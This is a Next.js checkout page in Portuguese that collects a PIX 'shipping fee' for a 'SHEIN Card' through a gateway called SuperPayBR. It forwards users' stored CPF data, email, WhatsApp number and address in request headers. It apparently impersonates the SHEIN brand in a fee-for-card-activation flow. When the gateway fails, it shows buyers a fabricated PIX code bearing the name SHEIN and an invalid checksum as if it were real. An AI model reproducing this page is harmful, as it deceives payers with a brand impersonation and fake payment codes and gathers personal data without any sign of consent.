"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, AlertCircle, RefreshCw, Wifi, WifiOff, Bell } from "lucide-react"
import { useWebhookPaymentDetector } from "@/hooks/use-webhook-payment-detector"
import { useOptimizedTracking } from "@/hooks/use-optimized-tracking"
import { SmartQRCode } from "@/components/smart-qr-code"

interface InvoiceData {
  id: string
  invoice_id: string
  pix: {
    payload: string
    image: string
    qr_code: string
  }
  status: {
    code: number
    title: string
    text: string
  }
  valores: {
    bruto: number
    liquido: number
  }
  vencimento: {
    dia: string
  }
  type: "real" | "simulated" | "emergency"
  external_id?: string
}

export default function SuperPayBRCheckoutPage() {
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(7200) // 2 horas
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [externalId, setExternalId] = useState<string | null>(null)
  const [isRedirecting, setIsRedirecting] = useState(false)

  const router = useRouter()
  const searchParams = useSearchParams()
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const hasInitializedRef = useRef<boolean>(false)

  // Obter parâmetros da URL
  const amount = searchParams.get("amount") || "27.97"
  const shipping = searchParams.get("shipping") || "pac"
  const method = searchParams.get("method") || "PAC"

  // Optimized tracking
  const { track, trackPageView, trackConversion } = useOptimizedTracking({
    enableDebug: process.env.NODE_ENV === "development",
  })

  // WEBHOOK-BASED payment detection (OTIMIZADO)
  const {
    status: paymentStatus,
    isDetecting,
    checkCount,
    maxChecks,
    error: detectorError,
    lastCheck,
    progress,
    remainingChecks,
    checkNow,
  } = useWebhookPaymentDetector({
    externalId: externalId || "",
    enabled: !!externalId && !isRedirecting,
    checkInterval: 60000, // 1 minuto
    maxChecks: 5, // Apenas 5 verificações
    onPaymentConfirmed: (data) => {
      console.log("🎉 PAGAMENTO CONFIRMADO!")
      setIsRedirecting(true)

      // Track conversion
      trackConversion("payment_confirmed", data.amount)

      // Salvar confirmação
      localStorage.setItem("paymentConfirmed", "true")
      localStorage.setItem("paymentAmount", data.amount.toFixed(2))
      localStorage.setItem("paymentDate", data.paymentDate || new Date().toISOString())
      localStorage.setItem("paymentGateway", "superpaybr")
      localStorage.setItem("paymentSource", data.source || "webhook")

      // Redirecionar após 2 segundos
      setTimeout(() => {
        router.push("/upp/001")
      }, 2000)
    },
    onPaymentDenied: (data) => {
      console.log("❌ PAGAMENTO NEGADO!")
      track("payment_denied", { amount: data.amount, reason: data.statusName })
      setError(`Pagamento negado: ${data.statusName}`)
    },
    onPaymentExpired: (data) => {
      console.log("⏰ PAGAMENTO VENCIDO!")
      track("payment_expired", { amount: data.amount })
      setError("Pagamento vencido. Gere um novo PIX.")
    },
    onPaymentCanceled: (data) => {
      console.log("🚫 PAGAMENTO CANCELADO!")
      track("payment_canceled", { amount: data.amount })
      setError("Pagamento cancelado.")
    },
    onPaymentRefunded: (data) => {
      console.log("🔄 PAGAMENTO ESTORNADO!")
      track("payment_refunded", { amount: data.amount })
      setError("Pagamento estornado.")
    },
  })

  // Track page view APENAS UMA VEZ
  useEffect(() => {
    if (!hasInitializedRef.current) {
      hasInitializedRef.current = true
      trackPageView("/checkout")
      track("checkout_page_loaded", {
        amount: Number.parseFloat(amount),
        shipping_method: method,
      })
    }
  }, []) // Dependências vazias para executar apenas uma vez

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice && !paymentStatus?.isPaid && !isRedirecting) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
      track("payment_timeout", { amount: Number.parseFloat(amount) })
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice, paymentStatus?.isPaid, isRedirecting])

  // Carregar dados APENAS UMA VEZ
  useEffect(() => {
    if (!hasInitializedRef.current) {
      createInvoice()
    }
  }, [])

  // Configurar external_id APENAS UMA VEZ
  useEffect(() => {
    if (invoice && !externalId) {
      const capturedExternalId = invoice.external_id || invoice.id

      if (capturedExternalId) {
        console.log("✅ External ID configurado:", capturedExternalId)
        localStorage.setItem("currentExternalId", capturedExternalId)
        setExternalId(capturedExternalId)

        // Track PIX generation APENAS UMA VEZ
        track("pix_generated", {
          external_id: capturedExternalId,
          amount: Number.parseFloat(amount),
          type: invoice.type,
        })
      }
    }
  }, [invoice]) // Apenas invoice como dependência

  const createInvoice = async () => {
    try {
      setLoading(true)
      setError(null)

      console.log("🔄 Criando fatura PIX SuperPayBR...")

      // Track invoice creation start
      track("invoice_creation_started", {
        amount: Number.parseFloat(amount),
        shipping_method: method,
      })

      // Carregar dados do usuário
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
      const deliveryAddress = JSON.parse(localStorage.getItem("deliveryAddress") || "{}")

      const response = await fetch("/api/superpaybr/create-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-cpf-data": JSON.stringify(cpfData),
          "x-user-email": userEmail,
          "x-user-whatsapp": userWhatsApp,
          "x-delivery-address": JSON.stringify(deliveryAddress),
        },
        body: JSON.stringify({
          amount: Number.parseFloat(amount),
          shipping,
          method,
        }),
      })

      const data = await response.json()

      if (data.success) {
        setInvoice(data.data)
        localStorage.setItem("superPayBRInvoice", JSON.stringify(data.data))

        console.log(`✅ Fatura SuperPayBR criada: ${data.data.type}`)

        // Track successful invoice creation
        track("invoice_created", {
          external_id: data.data.external_id,
          amount: data.data.valores.bruto / 100,
          type: data.data.type,
        })
      } else {
        throw new Error(data.error || "Erro ao criar fatura SuperPayBR")
      }
    } catch (error) {
      console.log("❌ Erro ao criar fatura SuperPayBR:", error)
      setError("Erro ao gerar PIX SuperPayBR. Tente novamente.")

      // Track error
      track("invoice_creation_error", {
        error: error instanceof Error ? error.message : "Unknown error",
        amount: Number.parseFloat(amount),
      })

      createEmergencyPix()
    } finally {
      setLoading(false)
    }
  }

  const createEmergencyPix = () => {
    console.log("🚨 Criando PIX de emergência...")

    const totalAmount = Number.parseFloat(amount)
    const emergencyExternalId = `EMERGENCY_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.quickchart.io/qr/v2/EMERGENCY${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

    const emergencyInvoice: InvoiceData = {
      id: emergencyExternalId,
      invoice_id: `EMERGENCY_${Date.now()}`,
      external_id: emergencyExternalId,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200&margin=1&format=png`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100),
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    setInvoice(emergencyInvoice)
    setError(null)
    console.log(`✅ PIX de emergência criado`)

    // Track emergency PIX creation
    track("emergency_pix_created", {
      amount: totalAmount,
      external_id: emergencyExternalId,
    })
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)

      // Track PIX code copy
      track("pix_code_copied", {
        external_id: externalId,
        amount: Number.parseFloat(amount),
      })
    } catch (error) {
      console.log("❌ Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const mins = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60

    if (hours > 0) {
      return `${hours.toString().padStart(2, "0")}:${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
    }
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!externalId) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento para:", externalId)

      const simulatedWebhookData = {
        externalId,
        isPaid: true,
        isDenied: false,
        isRefunded: false,
        isExpired: false,
        isCanceled: false,
        statusCode: 5,
        statusName: "Pagamento Confirmado (Simulado)",
        amount: Number.parseFloat(amount),
        paymentDate: new Date().toISOString(),
        lastUpdate: new Date().toISOString(),
        source: "simulation",
      }

      localStorage.setItem(`webhook_payment_${externalId}`, JSON.stringify(simulatedWebhookData))
      console.log("✅ Pagamento simulado!")
      track("payment_simulated", { external_id: externalId, amount: Number.parseFloat(amount) })
    } catch (error) {
      console.error("❌ Erro na simulação:", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-black mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Gerando PIX SuperPayBR...</h2>
            <p className="text-gray-600 mb-2">Aguarde enquanto processamos seu pagamento</p>
            <div className="text-sm text-gray-500">
              <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
              <p>Método: {method}</p>
              <p>Sistema: Otimizado (Mínimas Requisições)</p>
            </div>
          </div>
        </div>
      </main>
    )
  }

  if (error && !invoice) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2 text-red-600">Erro no Pagamento</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <button
              onClick={createInvoice}
              className="bg-black text-white px-6 py-2 rounded-lg hover:bg-black/90 transition-colors"
            >
              Tentar Novamente
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
            <h1 className="text-2xl font-bold mb-2">Pagamento PIX</h1>
          </div>

          {/* Success Message */}
          {(paymentStatus?.isPaid || isRedirecting) && (
            <div className="bg-green-100 border border-green-300 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-5 h-5 text-green-600" />
                <span className="font-bold text-green-800">✅ Pagamento Confirmado!</span>
                {isRedirecting && <RefreshCw className="w-4 h-4 animate-spin" />}
              </div>
              <p className="text-green-700 text-sm mt-2 text-center">
                {isRedirecting ? "Redirecionando para ativação do cartão..." : "Processando confirmação..."}
              </p>
            </div>
          )}

          {/* Error Message */}
          {error && (
            <div className="bg-red-100 border border-red-300 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <AlertCircle className="w-5 h-5 text-red-600" />
                <span className="font-bold text-red-800">Erro:</span>
              </div>
              <p className="text-red-700 text-sm mt-1 text-center">{error}</p>
            </div>
          )}

          {/* Detector Error */}
          {detectorError && (
            <div className="bg-orange-100 border border-orange-300 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <AlertCircle className="w-5 h-5 text-orange-600" />
                <span className="font-bold text-orange-800">Aviso:</span>
              </div>
              <p className="text-orange-700 text-sm mt-1 text-center">{detectorError}</p>
            </div>
          )}

          {/* Timer */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-center space-x-2">
              <Clock className="w-5 h-5 text-yellow-600" />
              <span className="font-bold text-yellow-800">Tempo restante: {formatTime(timeLeft)}</span>
            </div>
          </div>

          {/* Valor */}
          <div className="text-center mb-6">
            <p className="text-gray-600 mb-1">Valor a pagar</p>
            <p className="text-3xl font-bold text-green-600">R$ {Number.parseFloat(amount).toFixed(2)}</p>
            <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
          </div>

          {/* QR Code */}
          <div className="text-center mb-6">
            <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
              {invoice && <SmartQRCode invoice={invoice} width={200} height={200} className="mx-auto" />}
            </div>
            <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
          </div>

          {/* Código PIX */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={invoice?.pix.payload || ""}
                readOnly
                className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
              />
              <button
                onClick={copyPixCode}
                className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                  copied ? "bg-green-500 text-white" : "bg-black text-white hover:bg-black/90"
                }`}
              >
                {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              </button>
            </div>
            {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
          </div>

          {/* Status do Detector OTIMIZADO */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center space-x-2">
                {isDetecting ? (
                  <Wifi className="w-4 h-4 text-green-500" />
                ) : remainingChecks > 0 ? (
                  <WifiOff className="w-4 h-4 text-orange-500" />
                ) : (
                  <Bell className="w-4 h-4 text-blue-500" />
                )}
                <p className="text-sm font-medium text-blue-800">
                  {isDetecting ? "Detecção Ativa" : remainingChecks > 0 ? "Aguardando Webhook" : "Apenas Webhook"}
                </p>
              </div>
              <div className="text-right">
                <p className="text-xs text-blue-600">
                  {lastCheck ? `${lastCheck.toLocaleTimeString()}` : "Aguardando..."}
                </p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-xs text-blue-600 mb-2">
              <div>
                <p>
                  Verificações: {checkCount}/{maxChecks}
                </p>
                <p>Restantes: {remainingChecks}</p>
              </div>
              <div>
                <p>Intervalo: 1min (otimizado)</p>
                <p>Modo: Webhook-first</p>
              </div>
            </div>

            {isDetecting && (
              <div className="w-full bg-gray-200 rounded-full h-1.5 mb-2">
                <div
                  className="bg-blue-500 h-1.5 rounded-full transition-all duration-300"
                  style={{ width: `${Math.min(progress, 100)}%` }}
                />
              </div>
            )}

            <div className="flex justify-between items-center">
              <span className="text-xs text-blue-600">
                {remainingChecks > 0 ? "Verificação mínima ativa" : "Aguardando apenas webhook"}
              </span>
              {remainingChecks > 0 && (
                <button
                  onClick={checkNow}
                  disabled={checkCount >= maxChecks}
                  className="text-xs bg-blue-100 hover:bg-blue-200 disabled:bg-gray-100 disabled:text-gray-400 text-blue-700 px-2 py-1 rounded transition-colors"
                >
                  Verificar Agora
                </button>
              )}
            </div>
          </div>

          {/* Instruções */}
          <div className="space-y-3 text-sm text-gray-600">
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                1
              </span>
              <span>Abra o app do seu banco</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                2
              </span>
              <span>Escaneie o QR Code ou cole o código PIX</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                3
              </span>
              <span>Confirme o pagamento</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                4
              </span>
              <span>Receba confirmação automática via webhook</span>
            </div>
          </div>

          {/* Sistema Otimizado */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-6">
            <div className="flex items-start space-x-2">
              <Bell className="w-5 h-5 text-green-600 mt-0.5" />
              <div>
                <h4 className="text-sm font-medium text-green-800 mb-1">Sistema Otimizado ✅</h4>
                <p className="text-xs text-green-700">
                  Requisições mínimas: apenas 5 verificações em 5 minutos. Detecção principal via webhook SuperPay.
                  Sistema otimizado para evitar rate limiting e reduzir consumo de recursos.
                </p>
              </div>
            </div>
          </div>

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && externalId && (
            <button
              onClick={simulatePayment}
              disabled={paymentStatus?.isPaid || isRedirecting}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR PAGAMENTO (TESTE)
            </button>
          )}

          {/* Debug Info (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && (
            <div className="mt-4 p-3 bg-gray-100 rounded-lg text-xs">
              <p>
                <strong>Debug Info:</strong>
              </p>
              <p>External ID: {externalId || "N/A"}</p>
              <p>Detectando: {isDetecting ? "Sim" : "Não"}</p>
              <p>
                Verificações: {checkCount}/{maxChecks}
              </p>
              <p>Restantes: {remainingChecks}</p>
              <p>Última verificação: {lastCheck?.toLocaleTimeString() || "N/A"}</p>
              <p>Status: {paymentStatus?.statusName || "N/A"}</p>
              {paymentStatus && <p>Fonte: {paymentStatus.source}</p>}
            </div>
          )}
        </div>
      </div>
    </main>
  )
}
